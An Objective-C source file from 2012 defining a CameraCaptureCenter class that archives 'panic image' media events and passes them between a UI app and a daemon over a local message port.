//
//  CameraCaptureCenter.m
//  CameraCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 6/7/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "CameraCaptureCenter.h"
#import "EventDelegate.h"
#import "MessagePortIPCSender.h"
#import "MessagePortIPCReader.h"
#import "DebugStatus.h"
#import "DefStd.h"
#import "MediaEvent.h"

@interface CameraCaptureCenter (private) 
- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName;
- (BOOL) sendData: (NSData *) aData;
@end


@implementation CameraCaptureCenter

@synthesize mEventCenter;

- (id) init {
	self = [super init];
	if (self != nil) {
		
	}
	return self;
}


#pragma mark -
#pragma mark Start/Stop MessagePortIPCReader by a daemon

- (void) startMessagePort {
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kPanicImageMessagePort 
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
}

- (void) stopMessagePort {
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
}

/**
 - Method name:						dataDidReceivedFromSocket
 - Purpose:							Callback function when data is received via message port
 - Argument list and description:	aRawData, the received data
 - Return description:				No return type
 */
- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {

	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    MediaEvent *mediaEvent = [unarchiver decodeObjectForKey:kPanicImageArchived];
	DLog(@"Media event captured by ui, mediaEvent = %@", mediaEvent)
	DLog(@"Media event full path = %@", [mediaEvent fullPath])
    [unarchiver finishDecoding];
	
	if ([mEventCenter respondsToSelector:@selector(eventFinished:)]) {
		[mEventCenter performSelector:@selector(eventFinished:) withObject:mediaEvent];
	}
	[unarchiver release];
}


#pragma mark -
#pragma mark Event sending by UI application

- (void) eventFinished: (FxEvent *) aEvent {
	NSMutableData* data = [[NSMutableData alloc] init];
//	NSString *str = @"hello world !!!";
//	NSMutableData *data = [NSMutableData dataWithData:[str dataUsingEncoding:NSUTF8StringEncoding]];   
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:aEvent forKey:kPanicImageArchived];
	[archiver finishEncoding];
	[self sendData:data];
	[archiver release];
	[data release];
}

- (BOOL) sendData: (NSData *) aData {

	BOOL success = NO;
	if (!(success = [self sendData:aData toPort:kPanicImageMessagePort])) {
		DLog(@"!!!!!!!!!!!!!!!!!!!! send event to the daemon")
	}

	return success;
}

- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName {
	BOOL success = NO;
	
	mMessagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	success = [mMessagePortSender writeDataToPort:aData];
	[mMessagePortSender release];
	mMessagePortSender = nil;
	
	return success;
}

- (void) dealloc {
	[self stopMessagePort];
	[super dealloc];
}


@end
